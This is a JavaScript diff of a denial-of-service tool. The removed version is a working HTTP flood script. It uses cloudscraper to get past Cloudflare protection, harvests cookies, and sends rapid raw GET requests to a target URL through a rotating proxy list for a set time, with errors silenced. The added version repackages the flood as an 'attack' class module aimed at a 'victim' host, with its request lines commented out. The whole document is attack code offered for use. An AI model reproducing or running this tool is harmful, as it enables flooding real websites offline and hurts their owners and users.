@@ -1,76 +1,74 @@
-const EventEmitter = require('events');
-const emitter = new EventEmitter();
-emitter.setMaxListeners(Number.POSITIVE_INFINITY);
-var fs = require('fs');
-let net = require('net');
-var proxies = fs.readFileSync(process.argv[4], 'utf-8').replace(/\r/g, '').split('\n');
+const net = require('net');
 
-process.on('uncaughtException', function (err) {
-//  console.log(err);
-});
-
-process.on('unhandledRejection', function (err) {
-//  console.log(err);
-});
-
-var cloudscraper = require('cloudscraper');
-const url = require('url');
-var p = process.argv[2];
-var target = p.replace('https', 'http');
-var time = process.argv[3];
-var { host } = url.parse(target);
-var { path } = url.parse(target);
-let cookies = [];
-
-setInterval(() => {
-  let proxy = proxies[Math.floor(Math.random() * proxies.length)];
-  cloudscraper.get({
-    url: target,
-    proxy: 'http://' + proxy
-  }, function (error, response) {
-    if (response && response.request.headers.cookie) {
-      let cookie = response.request.headers.cookie;
-      let ua = response.request.headers['User-Agent'];
-      cookies.push({ cookie, ua, proxy });
-    }
-  });
-});
-var counter = 0;
-
-function send(cookie, proxy, ua) {
-  let [ip, port] = proxy.split(':');
-  var s = net.Socket();
-
-  s.connect(port, ip);
-
-  s.once('error', err => {
-    console.log('Error : ' + ip + ":" + port);
-  });
-
-  s.once('disconnect', () => {
-    console.log('Disconnect');
-  });
-
-  s.once('data', data => {
-    console.log('Connected : ' + ip + ":" + port + " : " + cookie);
-    setTimeout(() => {
-      s.destroy();
-      delete s;
-      send(cookie, proxy, ua);
-    }, 5000);
-  });
-
-  for (var i = 0; i < 7; i++) {
-    s.write('GET ' + path + ' HTTP/1.1\r\nHost: ' + host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + ua + '\r\nUpgrade-Insecure-Requests: 1\r\nCookie: ' + cookie + '\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\n\r\n');
-  }
+function randInteger(min, max) {
+    let rand = min - 0.5 + Math.random() * (max - min + 1);
+    rand = Math.round(rand);
+    return rand;
 }
 
-var int = setInterval(() => {
-  cookies.forEach(json => {
-    send(json.cookie, json.proxy, json.ua);
-  });
-}, 3);
+class attack {
+    constructor(userAgents, callback) {
+        this.userAgents = userAgents;
 
-setTimeout(() => {
-    process.exit(1);
-}, time * 1000);
+        this.isRunning = false;
+        this.stats = {
+            errors: 0,
+            success: 0,
+            loop: 0
+        };
+        this.logInterval = setInterval(() => {
+            if (this.isRunning) {
+                callback(this.stats);
+                this.resetStats();
+            }
+        }, 10);
+    }
+
+    start(props) {
+        this.isRunning = true;
+        if (this.isRunning) {
+            let socket = net.connect({host: props.proxy.host, port: props.proxy.port});
+            socket.once('error', err => {
+                this.stats.errors++;
+            });
+            socket.once('disconnect', () => {
+                this.stats.errors++;
+                if (this.isRunning)
+                    this.start(props);
+            });
+
+            socket.once('data', data => {
+                this.stats.success++;
+                if (this.isRunning)
+                    this.start(props);
+            });
+
+            this.stats.loop++;
+
+            for (let j = 0; j < props.requests; j++) {
+                // we have commented most of this out, because we define it in the scripts file.
+                //let userAgent = this.userAgents[randInteger(0, this.userAgents.length)];
+                //if (!props.victim.host.startsWith('http://') && !props.victim.host.startsWith('https://'))
+                props.victim.host = 'http://' + props.victim.host;
+                //socket.write('GET ' + target + '/ HTTP/1.1\r\nHost: ' + host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + ua + '\r\nUpgrade-Insecure-Requests: 1\r\nCookie: ' + cookie + '\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
+                //socket.write(`GET ${props.victim.host} HTTP/1.1\r\nHost: ${props.victim.host.split('//')[1].split('/')[0]}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ${userAgent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\n\r\n`);
+            }
+        }
+    }
+
+    stop() {
+        this.isRunning = false;
+        this.resetStats();
+    }
+
+    resetStats() {
+        this.stats = {
+            errors: 0,
+            success: 0,
+            loop: 0
+        };
+    }
+}
+
+module.exports = attack;
+// script made by mezy - credit where credit is due for the attack.js
